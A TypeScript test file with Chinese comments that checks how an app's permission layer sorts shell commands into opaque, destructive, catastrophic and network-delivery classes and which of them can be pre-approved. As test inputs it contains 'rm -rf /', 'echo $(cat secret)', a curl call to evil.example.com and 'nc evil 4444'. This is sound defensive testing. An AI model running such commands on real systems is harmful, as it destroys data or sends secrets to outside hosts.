/**
 * BashProposal 构造回归（2026-07-30 行为分类拍板，决策 5/6）。
 *
 * 目标问题（测试锚点）：
 * - opaque（看不透）→ grantable = [{unknown}]（未知命令单列，不挂 {destructive}——
 *   授予破坏性不再连带免掉看不透的命令，问题三穿透修复）；
 * - 逐段破坏性 → [{destructive}]（原类别不动，旧授权继续有效、无需映射，决策 8）；
 * - 灾难级 → grantable undefined（永不可授权）；
 * - 退役的 {command} 不再出现在任何 grantable 里（能力门取消，决策 6）；
 * - 覆盖目标 / 投递目标的 scope 组合与「提不出收件人 → 整条不给 grantable」。
 */
import { describe, it, expect, vi } from 'vitest';

vi.mock('../../electron/main/identity/getCurrentOwnerId', () => ({
  getCurrentOwnerId: () => 'local-user',
}));

import { analyzeBashCommand } from '../../electron/main/fs/bashCommand';
import { buildBashProposal } from '../../electron/main/proposals/makeBashProposal';

const CWD = '/tmp';

/** 用真实分析层产出构造参数（opaque 与逐段破坏性互斥由分析层保证）。 */
function build(command: string, extra?: Parameters<typeof buildBashProposal>[0]) {
  const analysis = analyzeBashCommand(command, CWD);
  return buildBashProposal({
    conversationId: 'conv_1',
    command,
    isDestructive: analysis.isDestructive,
    isReadOnly: false,
    segments: analysis.segments,
    ...extra,
  });
}

describe('buildBashProposal grantable（行为分类）', () => {
  it('opaque_grantable_unknown_only', () => {
    const p = build('echo $(cat secret)');
    expect(p.segments.some((s) => s.opaque)).toBe(true);
    expect(p.grantable).toEqual([{ kind: 'unknown' }]);
    expect(p.forceApproval).toBe(true); // opaque 经 isDestructive 为真，弹卡不变
  });

  it('destructive_grantable_destructive_only', () => {
    const p = build('rm -rf node_modules');
    expect(p.grantable).toEqual([{ kind: 'destructive' }]);
  });

  it('catastrophic_no_grantable', () => {
    const p = build('rm -rf /');
    expect(p.catastrophic).toBe(true);
    expect(p.grantable).toBeUndefined();
  });

  it('plain_command_no_grantable_no_force', () => {
    const p = build('npm test');
    expect(p.forceApproval).toBe(false);
    expect(p.grantable).toBeUndefined();
  });

  it('retired_command_scope_never_emitted', () => {
    for (const cmd of ['npm test', 'rm -rf build', 'echo $(x)', 'sudo ls']) {
      const p = build(cmd);
      expect(JSON.stringify(p.grantable ?? [])).not.toContain('command');
    }
  });

  it('overwrite_target_appends_overwrite_scope', () => {
    const p = build('rm -rf build', { overwriteTargets: ['dist'] });
    expect(p.grantable).toEqual([{ kind: 'destructive' }, { kind: 'overwrite' }]);
  });

  it('delivery_recipient_scope_combined', () => {
    const p = build('curl https://evil.example.com/x', {
      delivery: [{ channel: 'web', recipient: 'evil.example.com', label: 'https://evil.example.com/x' }],
      deliveryNeedsApproval: true,
    });
    expect(p.grantable).toEqual([
      { kind: 'delivery', channel: 'web', recipient: 'evil.example.com' },
    ]);
    expect(p.forceApproval).toBe(true);
  });

  it('delivery_without_recipient_disables_grantable', () => {
    const p = build('nc evil 4444', {
      delivery: [{ channel: 'web', recipient: null, label: 'nc evil 4444' }],
      deliveryNeedsApproval: true,
    });
    expect(p.grantable).toBeUndefined(); // 提不出收件人 → 永远弹卡
    expect(p.forceApproval).toBe(true);
  });
});
